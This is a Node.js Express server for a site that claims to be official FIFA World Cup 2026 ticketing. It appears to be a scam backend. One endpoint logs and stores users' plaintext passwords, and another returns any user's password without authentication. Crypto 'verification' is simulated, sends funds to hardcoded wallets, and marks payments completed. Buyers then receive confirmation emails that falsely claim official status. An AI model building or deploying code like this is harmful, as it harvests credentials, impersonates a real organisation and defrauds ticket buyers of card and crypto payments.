const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
require('dotenv').config();

const nodemailer = require('nodemailer');

// Email transporter configuration - UPDATED FOR RENDER
// Using 'service: gmail' handles ports automatically and prevents timeouts
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Verify email configuration on startup
transporter.verify((error, success) => {
    if (error) {
        console.log('❌ Email configuration error:', error);
    } else {
        console.log('✅ Email server is ready to send messages');
    }
});

const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// In-memory storage
const transactions = [];
const userCredentials = [];

// Cryptocurrency addresses
const CRYPTO_ADDRESSES = {
    'USDT_TRC20': 'TJzKVimFzF7tGQUH1NemCrctiZPPWrRzj6',
    'SOL': 'BeCmckF5KDGCY3jxG2r8o8VqQy8JySyA94i9osB45sVd',
    'BTC': 'bc1qqnmz38llzghmaskhq6wy3n6hjk68gh570a27sw',
    'ETH': '0x7978f226bbce9f03cac5c6d32526291a776b7436',
    'USDT_ERC20': '0xf4f2db3ce0cf82594255ab301b77e0beec2e1a47'
};

const CRYPTO_NETWORKS = {
    'USDT_TRC20': 'TRC20 Network',
    'SOL': 'SOLANA Network',
    'BTC': 'Bitcoin Network',
    'ETH': 'Ethereum ERC20 Network',
    'USDT_ERC20': 'Ethereum ERC20 Network'
};

function generateTransactionId() {
    return 'FIFA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function validateTransactionId(txnId, cryptoType) {
    const validators = {
        'BTC': (id) => /^[a-fA-F0-9]{64}$/.test(id),
        'ETH': (id) => /^0x[a-fA-F0-9]{64}$/.test(id),
        'USDT_ERC20': (id) => /^0x[a-fA-F0-9]{64}$/.test(id),
        'USDT_TRC20': (id) => /^[a-fA-F0-9]{64}$/.test(id),
        'SOL': (id) => /^[a-zA-Z0-9]{87,88}$/.test(id)
    };
    const validator = validators[cryptoType];
    return validator ? validator(txnId) : true; 
}

// Store user credentials endpoint
app.post('/api/store-credentials', (req, res) => {
    try {
        const { username, password, email, name } = req.body;
        console.log('🔐 Storing credentials:', { username, password, email, name });
        
        const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
        
        if (existingUserIndex !== -1) {
            userCredentials[existingUserIndex] = { username, password, email, name, timestamp: new Date().toISOString() };
        } else {
            userCredentials.push({ username, password, email, name, timestamp: new Date().toISOString() });
        }
        
        console.log('✅ Credentials stored successfully');
        res.json({ success: true, message: 'Credentials stored successfully' });
        
    } catch (error) {
        console.error('❌ Error storing credentials:', error);
        res.json({ success: false, message: error.message });
    }
});

// Retrieve password endpoint
app.get('/api/get-password/:username', (req, res) => {
    try {
        const { username } = req.params;
        const user = userCredentials.find(u => u.username === username);
        
        if (user) {
            res.json({
                success: true,
                username: user.username,
                password: user.password,
                email: user.email,
                name: user.name,
                timestamp: user.timestamp
            });
        } else {
            res.status(404).json({ success: false, message: 'User not found' });
        }
    } catch (error) {
        console.error('❌ Error retrieving password:', error);
        res.json({ success: false, message: error.message });
    }
});

app.get('/api/all-users', (req, res) => {
    try {
        res.json({
            success: true,
            count: userCredentials.length,
            users: userCredentials.map(user => ({
                username: user.username,
                email: user.email,
                name: user.name,
                timestamp: user.timestamp
            }))
        });
    } catch (error) {
        console.error('❌ Error retrieving users:', error);
        res.json({ success: false, message: error.message });
    }
});

app.get('/', (req, res) => {
    res.json({ 
        status: '🎉 FIFA Ticket Backend with Stripe & Crypto - Running!',
        version: '3.1.0',
        stripe: 'Enabled',
        crypto_payments: 'ENABLED',
        password_storage: 'ENABLED - In Memory',
        endpoints: [
            'POST /api/store-credentials',
            'POST /api/process-payment',
            'POST /api/send-confirmation'
        ]
    });
});

app.get('/api/stripe-config', (req, res) => {
    res.json({
        publishableKey: process.env.STRIPE_PUBLISHABLE_KEY
    });
});

app.get('/api/crypto-addresses', (req, res) => {
    res.json({
        success: true,
        addresses: CRYPTO_ADDRESSES,
        networks: CRYPTO_NETWORKS
    });
});

// Process card payment
app.post('/api/process-payment', async (req, res) => {
    try {
        const { customer, tickets, subtotal, fee, tax, total, currency = 'USD' } = req.body;

        console.log('💳 Payment request received:', {
            amount: total,
            currency,
            customer: customer.email,
            tickets: tickets.length
        });

        const stripeCustomer = await stripe.customers.create({
            email: customer.email,
            name: customer.name,
            address: {
                line1: customer.address,
                city: customer.city,
                postal_code: customer.postal,
                country: customer.country
            }
        });

        console.log('✅ Customer created:', stripeCustomer.id);

        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            customer: stripeCustomer.id,
            description: `FIFA World Cup 2026™ - ${tickets.length} Ticket(s)`,
            receipt_email: customer.email,
            metadata: {
                customer_name: customer.name,
                customer_email: customer.email,
                tickets_count: tickets.length,
                subtotal: subtotal.toString(),
                fee: fee.toString(),
                tax: tax.toString()
            }
        });

        console.log('✅ Payment Intent created:', paymentIntent.id);

        res.json({
            success: true,
            clientSecret: paymentIntent.client_secret,
            paymentIntentId: paymentIntent.id,
            customerId: stripeCustomer.id
        });

    } catch (error) {
        console.error('❌ Payment error:', error.message);
        res.json({ success: false, message: error.message });
    }
});

app.post('/api/verify-crypto', async (req, res) => {
    try {
        const { transactionId, senderAddress, cryptoType, expectedAmount, customer, tickets, paymentAddress } = req.body;

        console.log('₿ Crypto verification request:', { transactionId, cryptoType });

        if (!transactionId || !senderAddress) {
            return res.json({ success: false, verified: false, message: 'Transaction ID and sender address are required' });
        }

        if (!validateTransactionId(transactionId, cryptoType)) {
            return res.json({ success: false, verified: false, message: `Invalid transaction ID format for ${cryptoType}.` });
        }

        // Simulate verification
        await new Promise(resolve => setTimeout(resolve, 1000));

        const internalTxnId = generateTransactionId();
        const transaction = {
            transactionId: internalTxnId,
            type: 'crypto',
            cryptoType,
            cryptoTxnId: transactionId,
            senderAddress,
            paymentAddress: paymentAddress || CRYPTO_ADDRESSES[cryptoType],
            customer,
            tickets,
            status: 'completed',
            timestamp: new Date().toISOString()
        };

        transactions.push(transaction);

        console.log('✅ Crypto payment verified:', internalTxnId);

        res.json({
            success: true,
            verified: true,
            transactionId: internalTxnId,
            message: `${cryptoType} payment verified successfully`,
            transaction
        });

    } catch (error) {
        console.error('❌ Crypto verification error:', error);
        res.status(500).json({ success: false, verified: false, message: error.message });
    }
});

// ✅ IMPORTANT FIX: Send Confirmation (NON-BLOCKING)
// This ensures the frontend gets a "Success" response immediately, even if email fails/lags.
app.post('/api/send-confirmation', async (req, res) => {
    try {
        const { customer, tickets, payment, transactionId, total } = req.body;
        
        console.log('📧 Confirmation Request for:', customer.email);

        // 1. Respond to frontend immediately so it doesn't hang on "Processing..."
        res.json({
            success: true,
            message: 'Payment processed successfully. Email is being sent in background.'
        });
        
        // 2. Send Email in background (Fire and Forget)
        try {
            const emailHtml = generateTicketEmail(
                customer, 
                tickets, 
                payment, 
                transactionId, 
                payment.method
            );
            
            await sendEmail(
                customer.email,
                `🎉 FIFA World Cup 2026 - Ticket Confirmation #${transactionId}`,
                emailHtml
            );
            console.log('✅ Email sent successfully (Background)');
        } catch (emailError) {
            console.error('⚠️ Email failed to send (Background):', emailError.message);
            // We don't send an error response because we already sent "Success" to the user
        }
        
    } catch (error) {
        console.error('❌ Error in confirmation endpoint:', error);
        if (!res.headersSent) {
            res.json({ success: false, message: error.message });
        }
    }
});

app.get('/api/transactions', (req, res) => {
    res.json({
        success: true,
        count: transactions.length,
        transactions: transactions
    });
});

// Email template functions
function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
    const ticketList = tickets.map((ticket, index) => {
        const qty = ticket.quantity || 1;
        const itemTotal = ticket.price * qty;

        return `
        <div style="margin: 15px 0; padding: 15px; border: 1px solid #ddd; border-radius: 8px;">
            <h3 style="color: #1a1a2e; margin: 0 0 10px 0;">🎫 ${ticket.match.teams}</h3>
            <p style="margin: 5px 0;"><strong>Date:</strong> ${ticket.match.date}</p>
            <p style="margin: 5px 0;"><strong>Venue:</strong> ${ticket.match.venue}</p>
            <p style="margin: 5px 0;"><strong>Category:</strong> ${ticket.category.name}</p>
            <p style="margin: 5px 0;"><strong>Quantity:</strong> ${qty}</p>
            <p style="margin: 5px 0;"><strong>Price:</strong> USD ${itemTotal.toLocaleString()} <span style="font-size:0.8em; color:#666;">(${qty} × USD ${ticket.price.toLocaleString()})</span></p>
        </div>
    `}).join('');

    const subtotal = tickets.reduce((sum, item) => sum + (item.price * (item.quantity || 1)), 0);
    const fee = subtotal * 0.15;
    const tax = subtotal * 0.085;
    const total = subtotal + fee + tax;

    const paymentInfo = paymentMethod === 'crypto' ? `
        <p><strong>Payment Method:</strong> ${payment.cryptoType}</p>
        <p><strong>Transaction ID:</strong> ${payment.transactionId}</p>
    ` : `
        <p><strong>Payment Method:</strong> Credit/Debit Card</p>
        <p><strong>Transaction ID:</strong> ${transactionId}</p>
    `;

    return `
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; color: #333; }
                .header { background: #1a1a2e; color: white; padding: 20px; text-align: center; }
                .content { padding: 20px; }
                .ticket { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 8px; }
                .footer { background: #f8f9fa; padding: 15px; text-align: center; color: #666; }
                .total { background: #1a1a2e; color: white; padding: 15px; border-radius: 8px; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🎉 FIFA World Cup 2026™</h1>
                <h2>Your Ticket Purchase Confirmation</h2>
            </div>
            
            <div class="content">
                <p>Dear <strong>${customer.name}</strong>,</p>
                <p>Thank you for your purchase! Your tickets have been confirmed.</p>
                
                <h3>📋 Order Summary</h3>
                ${ticketList}
                
                <div class="total">
                    <h3 style="margin: 0; color: white;">💰 Payment Details</h3>
                    ${paymentInfo}
                    <p><strong>Subtotal:</strong> USD ${subtotal.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                    <p><strong>Resale Fee (15%):</strong> USD ${fee.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                    <p><strong>Tax:</strong> USD ${tax.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                    <p style="font-size: 1.2em; border-top: 1px solid rgba(255,255,255,0.3); padding-top: 10px; margin-top: 10px;">
                        <strong>Total Paid:</strong> USD ${total.toLocaleString(undefined, {minimumFractionDigits: 2})}
                    </p>
                </div>
                
                <h3>📱 Next Steps</h3>
                <p>Your tickets will be available in your FIFA account 48 hours before the match.</p>
            </div>
            
            <div class="footer">
                <p>FIFA World Cup 2026™ Official Ticketing</p>
            </div>
        </body>
        </html>
    `;
}

// Send email function
async function sendEmail(to, subject, html) {
    try {
        const mailOptions = {
            from: process.env.EMAIL_FROM,
            to: to,
            subject: subject,
            html: html
        };

        const result = await transporter.sendMail(mailOptions);
        console.log('✅ Email sent successfully:', result.messageId);
        return { success: true, messageId: result.messageId };
    } catch (error) {
        console.error('❌ Email sending failed:', error);
        throw error; // Throw to be caught by the background handler
    }
}

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
